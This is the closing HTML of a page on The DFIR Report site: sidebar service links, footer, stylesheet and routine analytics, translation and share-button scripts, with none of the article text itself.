<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="060ba8aeb0a074cb9676a9a8-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2025\/02\/24\/confluence-exploit-leads-to-lockbit-ransomware\/":42179};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.7.2" id="freenews-navigation-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.7.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.7.2" id="ResizeSensor-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.7.2" id="theia-sticky-sidebar-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.7.2" id="slick-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.7.2" id="freenews-slick-settings-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.7.2" id="jquery-sticky-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.7.2" id="freenews-sticky-settings-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.7.2" id="marquee-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.7.2" id="freenews-marquee-settings-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://stats.wp.com/e-202509.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"42179\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:14.3\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "42179" ]);
/* ]]> */
</script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/p/jetpack/14.3/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=14.3" id="google-translate-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.3" id="jetpack-block-subscriptions-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/p/jetpack/14.3/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="060ba8aeb0a074cb9676a9a8-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"91747f6bdeede26e","version":"2025.1.0","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e6611380fbbe475a97dc9cf0a0e9fd2b","b":1}' crossorigin="anonymous"></script>
</body>
</html>
